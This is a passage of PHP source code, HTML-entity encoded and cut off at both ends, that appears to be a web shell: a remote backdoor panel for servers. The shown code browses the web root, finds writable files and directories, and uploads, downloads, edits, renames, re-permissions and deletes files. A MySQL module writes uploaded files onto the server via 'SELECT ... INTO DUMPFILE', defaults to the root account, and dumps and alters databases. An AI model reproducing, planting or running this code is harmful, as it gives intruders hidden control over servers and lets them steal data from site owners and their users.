$drive-\u0026gt;Path . \u0026#39;)\u0026lt;/a\u0026gt;\u0026#39;); $comma = \u0026#39;\u0026lt;span\u0026gt;|\u0026lt;/span\u0026gt;\u0026#39;; } } echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php $findstr = $_POST[\u0026#39;findstr\u0026#39;]; $re = $_POST[\u0026#39;re\u0026#39;]; tbhead(); p(\u0026#39;\u0026lt;tr class=\u0026#34;alt1\u0026#34;\u0026gt;\u0026lt;td colspan=\u0026#34;7\u0026#34; style=\u0026#34;padding:5px;line-height:20px;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt;\u0026lt;div style=\u0026#34;float:right;\u0026#34;\u0026gt;\u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;uploadfile\u0026#34; value=\u0026#34;\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;input class=\u0026#34;bt\u0026#34; name=\u0026#34;doupfile\u0026#34; value=\u0026#34;Upload\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt;\u0026lt;input name=\u0026#34;uploaddir\u0026#34; value=\u0026#34;\u0026#39; . $nowpath . \u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34; /\u0026gt;\u0026lt;input name=\u0026#34;dir\u0026#34; value=\u0026#34;\u0026#39; . $nowpath . \u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34; /\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/form\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $_SERVER[\u0026#34;DOCUMENT_ROOT\u0026#34;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;WebRoot\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39; | \u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;.\\\u0026#39;);\u0026#34;\u0026gt;ScriptPath\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39; | \u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $nowpath . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;View All\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39; | View Writable ( \u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $nowpath . \u0026#39;\\\u0026#39;,\\\u0026#39;dir\\\u0026#39;);\u0026#34;\u0026gt;Directory\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39; | \u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $nowpath . \u0026#39;\\\u0026#39;,\\\u0026#39;file\\\u0026#39;);\u0026#34;\u0026gt;File\u0026lt;/a\u0026gt; )\u0026#39;); p(\u0026#39; | \u0026lt;a href=\u0026#34;javascript:createdir();\u0026#34;\u0026gt;Create Directory\u0026lt;/a\u0026gt; | \u0026lt;a href=\u0026#34;javascript:createfile(\\\u0026#39;\u0026#39; . $nowpath . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Create File\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;div style=\u0026#34;padding:5px 0;\u0026#34;\u0026gt;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt;Find string in files(current folder): \u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;findstr\u0026#34; value=\u0026#34;\u0026#39; . $findstr . \u0026#39;\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;input class=\u0026#34;bt\u0026#34; value=\u0026#34;Find\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; Type: \u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;writabledb\u0026#34; value=\u0026#34;\u0026#39; . $writabledb . \u0026#39;\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;input name=\u0026#34;dir\u0026#34; value=\u0026#34;\u0026#39; . $dir . \u0026#39;\u0026#34; type=\u0026#34;hidden\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;re\u0026#34; value=\u0026#34;1\u0026#34; type=\u0026#34;checkbox\u0026#34; \u0026#39; . ($re ? \u0026#39;checked\u0026#39; : \u0026#39;\u0026#39;) . \u0026#39; /\u0026gt; Regular expressions\u0026lt;/form\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Filename\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;16%\u0026#34;\u0026gt;Last modified\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;10%\u0026#34;\u0026gt;Size\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;20%\u0026#34;\u0026gt;Chmod / Perms\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;22%\u0026#34;\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); //查看所有可写文件和目录 $dirdata = array(); $filedata = array(); if ($view_writable == \u0026#39;dir\u0026#39;) { $dirdata = GetWDirList($nowpath); $filedata = array(); } elseif ($view_writable == \u0026#39;file\u0026#39;) { $dirdata = array(); $filedata = GetWFileList($nowpath); } elseif ($findstr) { $dirdata = array(); $filedata = GetSFileList($nowpath, $findstr, $re); } else { // 目录列表 //scandir()效率更高 $dirs = @opendir($dir); while ($file = @readdir($dirs)) { $filepath = $nowpath . $file; if (@is_dir($filepath)) { $dirdb[\u0026#39;filename\u0026#39;] = $file; $dirdb[\u0026#39;mtime\u0026#39;] = @date(\u0026#39;Y-m-d H:i:s\u0026#39;, filemtime($filepath)); $dirdb[\u0026#39;dirchmod\u0026#39;] = getChmod($filepath); $dirdb[\u0026#39;dirperm\u0026#39;] = getPerms($filepath); $dirdb[\u0026#39;fileowner\u0026#39;] = getUser($filepath); $dirdb[\u0026#39;dirlink\u0026#39;] = $nowpath; $dirdb[\u0026#39;server_link\u0026#39;] = $filepath; $dirdata[] = $dirdb; } else { $filedb[\u0026#39;filename\u0026#39;] = $file; $filedb[\u0026#39;size\u0026#39;] = sizecount(@filesize($filepath)); $filedb[\u0026#39;mtime\u0026#39;] = @date(\u0026#39;Y-m-d H:i:s\u0026#39;, filemtime($filepath)); $filedb[\u0026#39;filechmod\u0026#39;] = getChmod($filepath); $filedb[\u0026#39;fileperm\u0026#39;] = getPerms($filepath); $filedb[\u0026#39;fileowner\u0026#39;] = getUser($filepath); $filedb[\u0026#39;dirlink\u0026#39;] = $nowpath; $filedb[\u0026#39;server_link\u0026#39;] = $filepath; $filedata[] = $filedb; } } // while unset($dirdb); unset($filedb); @closedir($dirs); } @sort($dirdata); @sort($filedata); $dir_i = \u0026#39;0\u0026#39;; p(\u0026#39;\u0026lt;form id=\u0026#34;filelist\u0026#34; name=\u0026#34;filelist\u0026#34; action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\u0026#39;); makehide(\u0026#39;action\u0026#39;, \u0026#39;file\u0026#39;); makehide(\u0026#39;thefile\u0026#39;); makehide(\u0026#39;doing\u0026#39;); makehide(\u0026#39;dir\u0026#39;, $nowpath); foreach ($dirdata as $key =\u0026gt; $dirdb) { if ($dirdb[\u0026#39;filename\u0026#39;] != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; $dirdb[\u0026#39;filename\u0026#39;] != \u0026#39;.\u0026#39;) { if ($getdir \u0026amp;\u0026amp; $getdir == $dirdb[\u0026#39;server_link\u0026#39;]) { $attachsize = dirsize($dirdb[\u0026#39;server_link\u0026#39;]); $attachsize = is_numeric($attachsize) ? sizecount($attachsize) : \u0026#39;Unknown\u0026#39;; } else { $attachsize = \u0026#39;\u0026lt;a href=\u0026#34;javascript:getsize(\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;,\\\u0026#39;\u0026#39; . $dir . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Stat\u0026lt;/a\u0026gt;\u0026#39;; } $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td width=\u0026#34;2%\u0026#34; nowrap\u0026gt;\u0026lt;input name=\u0026#34;dl[]\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\u0026#34;\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $dirdb[\u0026#39;filename\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026lt;a href=\u0026#34;javascript:opfile(\\\u0026#39;newtime\\\u0026#39;,\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;,\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;dirlink\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $dirdb[\u0026#39;mtime\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39; . $attachsize . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:fileperm(\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $dirdb[\u0026#39;dirchmod\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt; / \u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:fileperm(\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $dirdb[\u0026#39;dirperm\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39; . $dirdb[\u0026#39;fileowner\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026lt;a href=\u0026#34;javascript:rename(\\\u0026#39;\u0026#39; . $dirdb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Rename\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); $dir_i++; } else { if ($dirdb[\u0026#39;filename\u0026#39;] == \u0026#39;..\u0026#39;) { p(\u0026#39;\u0026lt;tr class=\u0026#39; . bg() . \u0026#39;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td align=\u0026#34;center\u0026#34;\u0026gt;-\u0026lt;/td\u0026gt;\u0026lt;td nowrap colspan=\u0026#34;5\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;javascript:godir(\\\u0026#39;\u0026#39; . getUpPath($nowpath) . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Parent Directory\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/tr\u0026gt;\u0026#39;); } } } p(\u0026#39;\u0026lt;tr bgcolor=\u0026#34;#dddddd\u0026#34; stlye=\u0026#34;border-top:1px solid #fff;border-bottom:1px solid #ddd;\u0026#34;\u0026gt;\u0026lt;td colspan=\u0026#34;6\u0026#34; height=\u0026#34;5\u0026#34;\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); $file_i = \u0026#39;0\u0026#39;; foreach ($filedata as $key =\u0026gt; $filedb) { if ($filedb[\u0026#39;filename\u0026#39;] != \u0026#39;..\u0026#39; \u0026amp;\u0026amp; $filedb[\u0026#39;filename\u0026#39;] != \u0026#39;.\u0026#39;) { $fileurl = str_replace($_SERVER[\u0026#34;DOCUMENT_ROOT\u0026#34;], \u0026#39;\u0026#39;, $filedb[\u0026#39;server_link\u0026#39;]); $thisbg = bg(); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . $thisbg . \u0026#39;\u0026#34; onmouseover=\u0026#34;this.className=\\\u0026#39;focus\\\u0026#39;;\u0026#34; onmouseout=\u0026#34;this.className=\\\u0026#39;\u0026#39; . $thisbg . \u0026#39;\\\u0026#39;;\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td width=\u0026#34;2%\u0026#34; nowrap\u0026gt;\u0026lt;input name=\u0026#34;dl[]\u0026#34; type=\u0026#34;checkbox\u0026#34; value=\u0026#34;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\u0026#34;\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td\u0026gt;\u0026#39; . ((strpos($filedb[\u0026#39;server_link\u0026#39;], $_SERVER[\u0026#34;DOCUMENT_ROOT\u0026#34;]) !== false) ? \u0026#39;\u0026lt;a href=\u0026#34;\u0026#39; . $fileurl . \u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39; . $filedb[\u0026#39;filename\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39; : $filedb[\u0026#39;filename\u0026#39;]) . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026lt;a href=\u0026#34;javascript:opfile(\\\u0026#39;newtime\\\u0026#39;,\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;,\\\u0026#39;\u0026#39; . $filedb[\u0026#39;dirlink\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $filedb[\u0026#39;mtime\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39; . $filedb[\u0026#39;size\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:fileperm(\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $filedb[\u0026#39;filechmod\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt; / \u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:fileperm(\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;\u0026#39; . $filedb[\u0026#39;fileperm\u0026#39;] . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39; . $filedb[\u0026#39;fileowner\u0026#39;] . \u0026#39;\u0026lt;/td\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;td nowrap\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:dofile(\\\u0026#39;downfile\\\u0026#39;,\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Down\u0026lt;/a\u0026gt; | \u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:copyfile(\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Copy\u0026lt;/a\u0026gt; | \u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:opfile(\\\u0026#39;editfile\\\u0026#39;,\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;,\\\u0026#39;\u0026#39; . $filedb[\u0026#39;dirlink\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Edit\u0026lt;/a\u0026gt; | \u0026#39;); p(\u0026#39;\u0026lt;a href=\u0026#34;javascript:rename(\\\u0026#39;\u0026#39; . $filedb[\u0026#39;server_link\u0026#39;] . \u0026#39;\\\u0026#39;);\u0026#34;\u0026gt;Rename\u0026lt;/a\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); $file_i++; } } p(\u0026#39;\u0026lt;tr class=\u0026#34;head\u0026#34;\u0026gt;\u0026lt;td\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;Filename\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;16%\u0026#34;\u0026gt;Last modified\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;10%\u0026#34;\u0026gt;Size\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;20%\u0026#34;\u0026gt;Chmod / Perms\u0026lt;/td\u0026gt;\u0026lt;td width=\u0026#34;22%\u0026#34;\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;tr class=\u0026#34;\u0026#39; . bg() . \u0026#39;\u0026#34;\u0026gt;\u0026lt;td align=\u0026#34;center\u0026#34;\u0026gt;\u0026lt;input name=\u0026#34;chkall\u0026#34; value=\u0026#34;on\u0026#34; type=\u0026#34;checkbox\u0026#34; onclick=\u0026#34;CheckAll(this.form)\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;4\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;javascript:dofile(\\\u0026#39;delfiles\\\u0026#39;);\u0026#34;\u0026gt;Delete selected\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td align=\u0026#34;right\u0026#34;\u0026gt;\u0026#39; . $dir_i . \u0026#39; directories / \u0026#39; . $file_i . \u0026#39; files\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;/form\u0026gt;\u0026lt;/table\u0026gt;\u0026#39;); } // end dir elseif ($action == \u0026#39;sqlfile\u0026#39;) { if ($doing == \u0026#34;mysqlupload\u0026#34;) { $file = $_FILES[\u0026#39;uploadfile\u0026#39;]; $filename = $file[\u0026#39;tmp_name\u0026#39;]; if (file_exists($savepath)) { m(\u0026#39;The goal file has already existed\u0026#39;); } else { if (!$filename) { m(\u0026#39;Please choose a file\u0026#39;); } else { $fp = @fopen($filename, \u0026#39;r\u0026#39;); $contents = @fread($fp, filesize($filename)); @fclose($fp); $contents = bin2hex($contents); if (!$upname) $upname = $file[\u0026#39;name\u0026#39;]; $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); $result = q(\u0026#34;SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE \u0026#39;$savepath\u0026#39;;\u0026#34;); m($result ? \u0026#39;Upload success\u0026#39; : \u0026#39;Upload has failed: \u0026#39; . mysql_error()); } } } ?\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function mysqlfile(doing) { if (!doing) return; $(\u0026#39;doing\u0026#39;).value = doing; $(\u0026#39;mysqlfile\u0026#39;).dbhost.value = $(\u0026#39;dbinfo\u0026#39;).dbhost.value; $(\u0026#39;mysqlfile\u0026#39;).dbport.value = $(\u0026#39;dbinfo\u0026#39;).dbport.value; $(\u0026#39;mysqlfile\u0026#39;).dbuser.value = $(\u0026#39;dbinfo\u0026#39;).dbuser.value; $(\u0026#39;mysqlfile\u0026#39;).dbpass.value = $(\u0026#39;dbinfo\u0026#39;).dbpass.value; $(\u0026#39;mysqlfile\u0026#39;).dbname.value = $(\u0026#39;dbinfo\u0026#39;).dbname.value; $(\u0026#39;mysqlfile\u0026#39;).charset.value = $(\u0026#39;dbinfo\u0026#39;).charset.value; $(\u0026#39;mysqlfile\u0026#39;).submit(); } \u0026lt;/script\u0026gt; \u0026lt;?php !$dbhost \u0026amp;\u0026amp; $dbhost = \u0026#39;localhost\u0026#39;; !$dbuser \u0026amp;\u0026amp; $dbuser = \u0026#39;root\u0026#39;; !$dbport \u0026amp;\u0026amp; $dbport = \u0026#39;3306\u0026#39;; formhead(array(\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;MYSQL Information\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbinfo\u0026#39;)); makehide(\u0026#39;action\u0026#39;, \u0026#39;sqlfile\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026#39;); p(\u0026#39;DBHost:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbhost\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 20, \u0026#39;value\u0026#39; =\u0026gt; $dbhost)); p(\u0026#39;:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbport\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 4, \u0026#39;value\u0026#39; =\u0026gt; $dbport)); p(\u0026#39;DBUser:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbuser\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $dbuser)); p(\u0026#39;DBPass:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbpass\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $dbpass)); p(\u0026#39;DBName:\u0026#39;); makeinput(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;dbname\u0026#39;, \u0026#39;size\u0026#39; =\u0026gt; 15, \u0026#39;value\u0026#39; =\u0026gt; $dbname)); p(\u0026#39;DBCharset:\u0026#39;); makeselect(array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;charset\u0026#39;, \u0026#39;option\u0026#39; =\u0026gt; $charsetdb, \u0026#39;selected\u0026#39; =\u0026gt; $charset, \u0026#39;nokey\u0026#39; =\u0026gt; 1)); p(\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;); formfoot(); p(\u0026#39;\u0026lt;form action=\u0026#34;\u0026#39; . $self . \u0026#39;\u0026#34; method=\u0026#34;POST\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34; name=\u0026#34;mysqlfile\u0026#34; id=\u0026#34;mysqlfile\u0026#34;\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;h2\u0026gt;Upload file\u0026lt;/h2\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;\u0026lt;b\u0026gt;This operation the DB user must has FILE privilege\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;Save path(fullpath): \u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;savepath\u0026#34; size=\u0026#34;45\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; Choose a file: \u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;uploadfile\u0026#34; type=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;a href=\u0026#34;javascript:mysqlfile(\\\u0026#39;mysqlupload\\\u0026#39;);\u0026#34;\u0026gt;Upload\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;h2\u0026gt;Download file\u0026lt;/h2\u0026gt;\u0026#39;); p(\u0026#39;\u0026lt;p\u0026gt;File: \u0026lt;input class=\u0026#34;input\u0026#34; name=\u0026#34;mysqldlfile\u0026#34; size=\u0026#34;115\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt; \u0026lt;a href=\u0026#34;javascript:mysqlfile(\\\u0026#39;mysqldown\\\u0026#39;);\u0026#34;\u0026gt;Download\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026#39;); makehide(\u0026#39;dbhost\u0026#39;); makehide(\u0026#39;dbport\u0026#39;); makehide(\u0026#39;dbuser\u0026#39;); makehide(\u0026#39;dbpass\u0026#39;); makehide(\u0026#39;dbname\u0026#39;); makehide(\u0026#39;charset\u0026#39;); makehide(\u0026#39;doing\u0026#39;); makehide(\u0026#39;action\u0026#39;, \u0026#39;sqlfile\u0026#39;); p(\u0026#39;\u0026lt;/form\u0026gt;\u0026#39;); } elseif ($action == \u0026#39;mysqladmin\u0026#39;) { !$dbhost \u0026amp;\u0026amp; $dbhost = \u0026#39;localhost\u0026#39;; !$dbuser \u0026amp;\u0026amp; $dbuser = \u0026#39;root\u0026#39;; !$dbport \u0026amp;\u0026amp; $dbport = \u0026#39;3306\u0026#39;; $dbform = \u0026#39;\u0026lt;input type=\u0026#34;hidden\u0026#34; id=\u0026#34;connect\u0026#34; name=\u0026#34;connect\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt;\u0026#39;; if (isset($dbhost)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;dbhost\\\u0026#34; name=\\\u0026#34;dbhost\\\u0026#34; value=\\\u0026#34;$dbhost\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if (isset($dbuser)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;dbuser\\\u0026#34; name=\\\u0026#34;dbuser\\\u0026#34; value=\\\u0026#34;$dbuser\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if (isset($dbpass)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;dbpass\\\u0026#34; name=\\\u0026#34;dbpass\\\u0026#34; value=\\\u0026#34;$dbpass\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if (isset($dbport)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;dbport\\\u0026#34; name=\\\u0026#34;dbport\\\u0026#34; value=\\\u0026#34;$dbport\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if (isset($dbname)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;dbname\\\u0026#34; name=\\\u0026#34;dbname\\\u0026#34; value=\\\u0026#34;$dbname\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if (isset($charset)) { $dbform .= \u0026#34;\u0026lt;input type=\\\u0026#34;hidden\\\u0026#34; id=\\\u0026#34;charset\\\u0026#34; name=\\\u0026#34;charset\\\u0026#34; value=\\\u0026#34;$charset\\\u0026#34; /\u0026gt;\\n\u0026#34;; } if ($doing == \u0026#39;backupmysql\u0026#39; \u0026amp;\u0026amp; $saveasfile) { if (!$table) { m(\u0026#39;Please choose the table\u0026#39;); } else { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); $fp = @fopen($path, \u0026#39;w\u0026#39;); if ($fp) { foreach ($table as $k =\u0026gt; $v) { if ($v) { sqldumptable($v, $fp); } } fclose($fp); $fileurl = str_replace(SA_ROOT, \u0026#39;\u0026#39;, $path); m(\u0026#39;Database has success backup to \u0026lt;a href=\u0026#34;\u0026#39; . $fileurl . \u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39; . $path . \u0026#39;\u0026lt;/a\u0026gt;\u0026#39;); mysql_close(); } else { m(\u0026#39;Backup failed\u0026#39;); } } } if ($insert \u0026amp;\u0026amp; $insertsql) { $keystr = $valstr = $tmp = \u0026#39;\u0026#39;; foreach ($insertsql as $key =\u0026gt; $val) { if ($val) { $keystr .= $tmp . $key; $valstr .= $tmp . \u0026#34;\u0026#39;\u0026#34; . addslashes($val) . \u0026#34;\u0026#39;\u0026#34;; $tmp = \u0026#39;,\u0026#39;; } } if ($keystr \u0026amp;\u0026amp; $valstr) { $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport); m(q(\u0026#34;INSERT INTO $tablename ($keystr) VALUES ($valstr)\u0026#34;) ? \u0026#39;Insert new record of success\u0026#39; : mysql_error()); } } if ($update \u0026amp;\u0026amp; $insertsql \u0026amp;\u0026amp; $base64) { $valstr = $tmp = \u0026#39;\u0026#39;; foreach ($insertsql as $key =\u0026gt; $val) { $valstr .= $tmp . $key . \u0026#34;=\u0026#39;\u0026#34; . addslashes($val) . \u0026#34;\u0026#39;\u0026#34;; $tmp = \u0026#39;,\u0026#39;; } if ($valstr) { $where = base64_decode($base64); $mysqllink = mydbconn($dbhost, $dbuser, 